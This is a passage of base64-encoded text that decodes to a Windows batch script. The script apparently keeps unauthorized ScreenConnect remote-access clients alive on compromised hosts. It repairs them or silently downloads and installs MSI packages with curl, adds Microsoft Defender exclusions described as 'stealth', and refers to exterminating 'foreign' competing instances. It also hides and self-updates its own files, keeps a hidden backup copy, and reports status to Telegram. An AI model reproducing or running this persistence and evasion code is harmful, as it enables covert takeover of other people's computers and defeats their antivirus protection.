gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcmVt
IE0xMjogRklSU1QgcmVwYWlyIHRoZSByZWdpc3RlcmVkIHByb2R1Y3QgKHJlY3JlYXRlcyBzZXJ2
aWNlIHdpdGhvdXQNCnJlbSB0b3VjaGluZyB0aGUgQUxUIGluc3RhbmNlKTsgZnJlc2ggbXNpZXhl
YyBpbnN0YWxsIG9ubHkgYXMgZmFsbGJhY2suDQplY2hvIHN2YyBtaXNzaW5nIC0gaGVhbCBiZWdp
bj4+IiVMT0clIg0KY2FsbCA6UmVwYWlyUmVnaXN0ZXJlZCAiJUtFRVBfRlAlIg0Kc2MgcXVlcnkg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwN
CmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1f
T0s9MSINCiAgZ290byA6QWZ0ZXJIZWFsDQopDQpyZW0gcmVmdXNlIGZyZXNoIC9pIGlmIHByb2R1
Y3Qgc3RpbGwgcmVnaXN0ZXJlZCAtIFVwZ3JhZGUgdGFibGUgY2FuIHdpcGUgQUxUDQpzZXQgIlJF
R1NUQVRFPXVua25vd24iDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2Vi
YWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
aW9uIHJlZ2lzdGVyZWQgLUZwICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAi
UkVHU1RBVEU9JSVSIg0KaWYgL0kgIiFSRUdTVEFURSEiPT0ieWVzIiAoDQogIGVjaG8gcHJpbWFy
eV9yZWdpc3RlcmVkX3NraXBfZnJlc2hfaW5zdGFsbD4+IiVMT0clIg0KICBwb3dlcnNoZWxsIC1O
b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1P
TlZFUiUgLUV4dHJhICJyZWdpc3RlcmVkLXN0dWNrIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0
ZSBET1dOICJQcmltYXJ5IHJlZ2lzdGVyZWQgYnV0IHNlcnZpY2UgbWlzc2luZyAtIC9mYSBmYWls
ZWQ7IHJlZnVzZWQgL2kgdG8gcHJvdGVjdCBBTFQiDQogIGdvdG8gOkFmdGVySGVhbA0KKQ0KaWYg
IiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfVVJMJSIgIm1haW4iDQpp
ZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cxJT90PSVSQU5E
T00lIiAiZ2l0aHViLXBrZyINCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNp
ICIlTVNJX1BLRzIlIiAianNkZWxpdnItcGtnIg0KaWYgIiVJTlNUQUxMRUQlIj09IjAiICgNCiAg
cmVtIHByZWZlciB3b3JrZXItY2FjaGVkIC53dWNhY2hlXHBrZy5tc2kgKHNhbWUgYmluYXJ5IGFz
IGRlcGxveSkNCiAgYXR0cmliIC1oIC1zIC1yICIlTVNJQ0FDSEUlIiA+bnVsIDI+JjENCiAgZm9y
ICUlRiBpbiAoIiVNU0lDQUNIRSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQogICAgZWNo
byB3dWNhY2hlX3BrZ19yZXRyeT4+IiVMT0clIg0KICAgIGF0dHJpYiAtaCAtcyAtciAiJU1TSSUi
ID5udWwgMj4mMQ0KICAgIGNvcHkgL3kgIiVNU0lDQUNIRSUiICIlTVNJJSIgPm51bCAyPiYxDQog
ICkNCiAgZm9yICUlRiBpbiAoIiVNU0klIikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKA0KICAg
IGVjaG8gY2FjaGUgcmV0cnkgaW5zdGFsbD4+IiVMT0clIg0KICAgIGNhbGwgOk5vTXNpUG9saWN5
DQogICAgbXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09U
PVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwubG9nIiA+bnVsIDI+JjENCiAgICBz
ZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KICAgIGVjaG8gY2FjaGUgbXNpZXhlYyBleGl0PSFN
U0lFWElUIT4+IiVMT0clIg0KICAgIGlmICIhTVNJRVhJVCEiPT0iMTYxOCIgKA0KICAgICAgdGlt
ZW91dCAvdCAzMCAvbm9icmVhayA+bnVsDQogICAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9u
b3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lf
aGVhbDIubG9nIiA+bnVsIDI+JjENCiAgICAgIHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiDQog
ICAgICBlY2hvIGNhY2hlX3JldHJ5MTYxOF9leGl0PSFNU0lFWElUIT4+IiVMT0clIg0KICAgICkN
CiAgICBjYWxsIDpXYWl0U3ZjDQogICkNCikNCmNhbGwgOlJlc3RvcmVBbHQNCmlmICIlSU5TVEFM
TEVEJSI9PSIwIiAoDQogIGlmIGV4aXN0ICIlV0QlXG1zaV9oZWFsLmxvZyIgKA0KICAgIGVjaG8g
LS0tIG1zaV9oZWFsLmxvZyB0YWlsIC0tLT4+IiVMT0clIg0KICAgIHBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgIkdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAn
JVdEJVxtc2lfaGVhbC5sb2cnIC1UYWlsIDEwIiA+PiIlTE9HJSIgMj4mMQ0KICApDQogIGlmIG5v
dCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWElUPWZldGNoLWZhaWwiDQogIHBvd2Vyc2hlbGwg
LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAl
TU9OVkVSJSAtRXh0cmEgIm1zaS1mYWlsZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIEZB
SUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbiBhbGwgc291cmNlcyAobXNpZXhlYyBleGl0ICVNU0lF
WElUJSkiDQopIGVsc2UgKA0KICBlY2hvIHN2YyByZXN0b3JlZD4+IiVMT0clIg0KICBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVp
bGQgJU1PTlZFUiUgLUV4dHJhICJyZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUg
UkVTVE9SRUQgIlNjcmVlbkNvbm5lY3QgcmVpbnN0YWxsZWQgT0siDQopDQoNCjpBZnRlckhlYWwN
CnJlbSBNMTY6IEFMVCBwcmVzZW50LWJ1dC1zdG9wcGVkIC0+IHJlc3RhcnQsIHRoZW4gcmVwYWly
LWJ5LUdVSUQgKGV2ZXJ5IHRpY2spDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVB
TFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2MgcXVlcnkgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBp
ZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gYWx0IHN0b3BwZWQgLSByZXN0YXJ0L3JlcGFpcj4+
IiVMT0clIg0KICAgIG5ldCBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIg
Pm51bCAyPiYxDQogICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
ID5udWwgMj4mMQ0KICAgIHRpbWVvdXQgL3QgNSAvbm9icmVhayA+bnVsDQogICAgc2MgcXVlcnkg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0K
ICAgIGlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVs
bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
ZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtE
aXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogICkNCikNCnJlbSBNMTc6IEFMVCBzZXJ2aWNlIGVu
dHJ5IGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZCAtPiByZXBhaXItYnktR1VJRCBldmVy
eSB0aWNrDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAy
PiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIGFsdF9taXNzaW5nX3RyeV9yZXBhaXI+PiIl
TE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+
PiIlTE9HJSIgMj4mMQ0KKQ0KcmVtIChleHRlcm1pbmF0aW9uIGFscmVhZHkgcmFuIHByZS1oZWFs
IGluIFtFXTsgZm9yZWlnbiBzdXJ2aXZvcnMgY291bnRlZCB0aGVyZSkNCg0KcmVtIOKUgOKUgCBb
Rl0gc3RlYWx0aCByZS1zZWN1cmUgKHF1aWV0IERlZmVuZGVyIGV4Y2x1c2lvbiByZWZyZXNoKSDi
lIDilIANCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUNvbW1hbmQgInRyeSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBh
dGggJyVXRCUnLCclRVRMJScgLUVycm9yQWN0aW9uIFN0b3AgfSBjYXRjaCB7fSIgPm51bCAyPiYx
DQoNCnJlbSDilIDilIAgW0ddIHBlcmlvZGljIGZ1bGwgcmUtc2VjdXJlIGV2ZXJ5IH4yIGgg4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
DQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVz
dC1QYXRoICclV0QlXG93bl9zZWN1cmUuY21kJykgLWFuZCAoKCAtbm90IChUZXN0LVBhdGggJyVX
RCVcc2VjLmZsYWcnKSkgLW9yICgoKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBhdGgg
JyVXRCVcc2VjLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSAyKSkpeyBleGl0
IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNo
byBwZXJpb2RpYyByZS1zZWN1cmU+PiIlTE9HJSINCiAgY2FsbCAiJVdEJVxvd25fc2VjdXJlLmNt
ZCIgPj4iJUxPRyUiIDI+JjENCiAgZWNobyBkb25lPiIlV0QlXHNlYy5mbGFnIg0KKQ0KDQpyZW0g
4pSA4pSAIFtHMl0gTVVTVC1SVU4gZ3J5eGEgKGluc3RhbGwvaGVhbCBldmVyeSB0aWNrIHVudGls
IFJ1bm5pbmcpIOKUgOKUgA0Kc2V0ICJHUllYQV9XQVM9MCINCnNjIHF1ZXJ5ICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVy
cm9ybGV2ZWwgMSBzZXQgIkdSWVhBX1dBUz0xIg0KY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQppZiAi
JUdSWVhBX09LJSI9PSIxIiBpZiAiJUdSWVhBX1dBUyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1O
b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1P
TlZFUiUgLUV4dHJhICJncnl4YS1yZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUg
UkVTVE9SRUQgIkdyeXhhIFNjcmVlbkNvbm5lY3QgaW5zdGFsbGVkL3J1bm5pbmcgT0siDQopDQpp
ZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgImdyeXhh
LW11c3QtZmFpbCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRE9XTiAiR3J5eGEgKCVHUllY
QV9GUCUpIE1VU1QtUlVOIGZhaWxlZCAtIG5vdCBSdW5uaW5nIGFmdGVyIGluc3RhbGwvaGVhbCIN
CikNCg0KcmVtIOKUgOKUgCBbSF0gcXVpZXQgZGlnZXN0IChza2lwIGhlYWx0aHkgaG9zdHMg4oCU
IHdhcyBmbG9vZGluZyBUZWxlZ3JhbSkg4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
MSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAi
JVdEJSIgLUJ1aWxkICVNT05WRVIlID5udWwgMj4mMQ0Kc2V0ICJORUVEX0hCPTAiDQppZiAiJVBS
SU1fT0slIj09IjAiIHNldCAiTkVFRF9IQj0xIg0KaWYgJUZPUkVJR05fTEVGVCUgR1RSIDAgc2V0
ICJORUVEX0hCPTEiDQppZiAiJUdSWVhBX09LJSI9PSIwIiBzZXQgIk5FRURfSEI9MSINCmlmICIl
TkVFRF9IQiUiPT0iMCIgKA0KICBlY2hvIGhiX3NraXBfaGVhbHRoeT4+IiVMT0clIg0KKSBlbHNl
ICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYo
KFRlc3QtUGF0aCAnJUhCRkxBRyUnKSAtYW5kIChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRl
bSAtTGl0ZXJhbFBhdGggJyVIQkZMQUclJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1s
dCAzNjApeyBleGl0IDAgfSBlbHNlIHsgZXhpdCAxIH0iID5udWwgMj4mMQ0KICBpZiBlcnJvcmxl
dmVsIDEgKA0KICAgIGVjaG8gaGI+JUhCRkxBRyUNCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRnX3Jl
cG9ydC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1CdWlsZCAlTU9OVkVSJSAtQ291bnQg
IUNPVU5UISA+bnVsIDI+JjENCiAgICBlY2hvIGRpZ2VzdCBIQiBzZW50Pj4iJUxPRyUiDQogICkN
CikNCg0KcmVtIOKUgOKUgCBbSV0gc2VsZi11cGRhdGUgYXBwbHkgKGxhc3QgdGhpbmcgdGhpcyB0
aWNrKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmICIlU0VM
Rl9VUEQlIj09IjEiICgNCiAgZWNobyBzZWxmLXVwZGF0ZSBhcHBseT4+IiVMT0clIg0KICBhdHRy
aWIgLWggLXMgLXIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICBtb3ZlIC95ICIlV0Ql
XG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KcmVtIGtlZXAg
ZHVhbC1wYXRoIGJhY2t1cCBpbiBzeW5jIGV2ZXJ5IHRpY2sNCmlmIG5vdCBleGlzdCAiJUVUTCUi
IG1rZGlyICIlRVRMJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxvd25fbW9uLmNtZCIgKA0K
ICBhdHRyaWIgLWggLXMgLXIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+JjENCiAgY29weSAv
eSAiJVdEJVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+JjENCikNCmRl
bCAvZiAvcSAiJU1VVEVYJSIgPm51bCAyPiYxDQoNCmVjaG8gdGljayBkb25lOiBwcmltPSVQUklN
X09LJSBncnl4YT0lR1JZWEFfT0slIGFsdD0lQUxUX09LJSBmb3JlaWduPSVGT1JFSUdOX0xFRlQl
Pj4iJUxPRyUiDQplbmRsb2NhbA0KZXhpdCAvYiAwDQoNCnJlbSDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZAgaGVscGVycyDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZANCjpFbnN1cmVHcnl4YU11c3QNCnJlbSBHcnl4YSBpcyBt
YW5kYXRvcnk6IGtlZXAgY2xpbWJpbmcgdW50aWwgc2VydmljZSBpcyBSVU5OSU5HIChvciBsYWRk
ZXIgZXhoYXVzdGVkKS4NCnNldCAiR1JZWEFfT0s9MCINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9y
bGV2ZWwgMSAoDQogIHNldCAiR1JZWEFfT0s9MSINCiAgZWNobyBncnl4YV9hbHJlYWR5X3J1bm5p
bmc+PiIlTE9HJSINCiAgZXhpdCAvYiAwDQopDQplY2hvIGdyeXhhX211c3RfYmVnaW4+PiIlTE9H
JSINCg0KcmVtIDEpIHNlcnZpY2UgcHJlc2VudCBidXQgc3RvcHBlZCAtPiBzdGFydCBoYXJkDQpz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCmlm
IG5vdCBlcnJvcmxldmVsIDEgKA0KICBlY2hvIGdyeXhhX3N2Y19zdGFydD4+IiVMT0clIg0KICBz
YyBjb25maWcgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgc3RhcnQ9IGF1dG8g
Pm51bCAyPiYxDQogIHNjIGZhaWx1cmUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAl
KSIgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAvcmVzdGFy
dC8zMDAwID5udWwgMj4mMQ0KICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZ
WEFfRlAlKSIgPm51bCAyPiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdS
WVhBX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDYgL25vYnJlYWsgPm51bA0KICBzYyBz
dGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgc2Mg
cXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5H
IiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIHNldCAiR1JZWEFfT0s9MSINCiAg
ICBlY2hvIGdyeXhhX3N0YXJ0ZWRfb2s+PiIlTE9HJSINCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0K
DQpyZW0gMikgcmVnaXN0ZXJlZCBwcm9kdWN0IC0+IG1zaWV4ZWMgL2ZhIHJlcGFpciAoc2FmZSBm
b3Igc2libGluZ3MpDQpzZXQgIkdSRUc9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIu
cHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
b3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVHUllYQV9GUCUiIC1Xb3JrRGly
ICIlV0QlImApIGRvIHNldCAiR1JFRz0lJVIiDQplY2hvIGdyeXhhX3JlZ2lzdGVyZWQ9IUdSRUch
Pj4iJUxPRyUiDQppZiAvSSAiIUdSRUchIj09InllcyIgKA0KICBlY2hvIGdyeXhhX3JlcGFpcl9i
ZWdpbj4+IiVMT0clIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlR1JZWEFfRlAlIiAtV29ya0Rp
ciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAg
c2MgY29uZmlnICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHN0YXJ0PSBhdXRv
ID5udWwgMj4mMQ0KICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUp
IiA+bnVsIDI+JjENCiAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQog
IGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIHNldCAiR1JZWEFfT0s9MSINCiAgICBlY2hvIGdy
eXhhX3JlcGFpcmVkX29rPj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCiAgZWNobyBncnl4
YV9yZXBhaXJfbm90X3J1bm5pbmdfZm9yY2VfaW5zdGFsbD4+IiVMT0clIg0KKQ0KDQpyZW0gMykg
b3JwaGFuIHNlcnZpY2UgKHByZXNlbnQsIG5vdCByZWdpc3RlcmVkKSAtPiBkZWxldGUgdGhlbiBm
cmVzaCBpbnN0YWxsDQppZiAvSSBub3QgIiFHUkVHISI9PSJ5ZXMiICgNCiAgc2MgcXVlcnkgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJv
cmxldmVsIDEgKA0KICAgIGVjaG8gZ3J5eGFfb3JwaGFuX3N2Y19kZWxldGU+PiIlTE9HJSINCiAg
ICBzYyBzdG9wICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0K
ICAgIHNjIGRlbGV0ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+
JjENCiAgICB0aW1lb3V0IC90IDMgL25vYnJlYWsgPm51bA0KICApDQogIGlmIGV4aXN0ICIlUHJv
Z3JhbUZpbGVzKHg4NiklXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgKA0KICAg
IGVjaG8gZ3J5eGFfc3RhbGVfZGlyX2NsZWFuPj4iJUxPRyUiDQogICAgcm1kaXIgL3MgL3EgIiVQ
cm9ncmFtRmlsZXMoeDg2KSVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVs
IDI+JjENCiAgKQ0KKQ0KDQpyZW0gNCkgZnJlc2ggTVNJIGluc3RhbGwgLSBtYW5kYXRvcnkgKGdy
eXhhIEZQOyBkbyBub3Qgc2tpcCBpZiByZWdpc3RlcmVkLXN0dWNrKQ0KZWNobyBncnl4YV9pbnN0
YWxsX2JlZ2luPj4iJUxPRyUiDQppZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJDVVJMPWN1cmwu
ZXhlIg0Kc2V0ICJHX01TSV9SRUFEWT0wIg0KaWYgZXhpc3QgIiVNU0lDQUNIRV9HJSIgZm9yICUl
RiBpbiAoIiVNU0lDQUNIRV9HJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgY29weSAv
eSAiJU1TSUNBQ0hFX0clIiAiJU1TSV9HJSIgPm51bCAyPiYxDQogIHNldCAiR19NU0lfUkVBRFk9
MSINCiAgZWNobyBncnl4YV9tc2lfZnJvbV9jYWNoZT4+IiVMT0clIg0KKQ0KaWYgIiVHX01TSV9S
RUFEWSUiPT0iMCIgKA0KICAiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRp
bWVvdXQgMjUgLS1tYXgtdGltZSAzMDAgLW8gIiVNU0lfRyUudG1wIiAiJU1TSV9HUllYQSUiID4+
IiVMT0clIiAyPiYxDQogIGZvciAlJUYgaW4gKCIlTVNJX0clLnRtcCIpIGRvIGlmICUlfnpGIEdU
UiAxMDAwMDAwICgNCiAgICBtb3ZlIC95ICIlTVNJX0clLnRtcCIgIiVNU0lfRyUiID5udWwgMj4m
MQ0KICAgIGNvcHkgL3kgIiVNU0lfRyUiICIlTVNJQ0FDSEVfRyUiID5udWwgMj4mMQ0KICAgIHNl
dCAiR19NU0lfUkVBRFk9MSINCiAgICBlY2hvIGdyeXhhX21zaV9mZXRjaGVkPj4iJUxPRyUiDQog
ICkNCiAgZGVsIC9mIC9xICIlTVNJX0clLnRtcCIgPm51bCAyPiYxDQopDQppZiAiJUdfTVNJX1JF
QURZJSI9PSIwIiAoDQogICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4LXRp
bWUgMzAwIC1vICIlTVNJX0clLnRtcCIgIiVNU0lfR1JZWEElIiA+PiIlTE9HJSIgMj4mMQ0KICBm
b3IgJSVGIGluICgiJU1TSV9HJS50bXAiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQogICAg
bW92ZSAveSAiJU1TSV9HJS50bXAiICIlTVNJX0clIiA+bnVsIDI+JjENCiAgICBjb3B5IC95ICIl
TVNJX0clIiAiJU1TSUNBQ0hFX0clIiA+bnVsIDI+JjENCiAgICBzZXQgIkdfTVNJX1JFQURZPTEi
DQogICkNCiAgZGVsIC9mIC9xICIlTVNJX0clLnRtcCIgPm51bCAyPiYxDQopDQppZiAiJUdfTVNJ
X1JFQURZJSI9PSIxIiAoDQogIGNhbGwgOk5vTXNpUG9saWN5DQogIG1zaWV4ZWMgL2kgIiVNU0lf
RyUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYg
IiVXRCVcbXNpX2dyeXhhLmxvZyIgPj4iJUxPRyUiIDI+JjENCiAgc2V0ICJHRVhJVD0hRVJST1JM
RVZFTCEiDQogIGVjaG8gZ3J5eGFfbXNpZXhlY19leGl0PSFHRVhJVCE+PiIlTE9HJSINCiAgaWYg
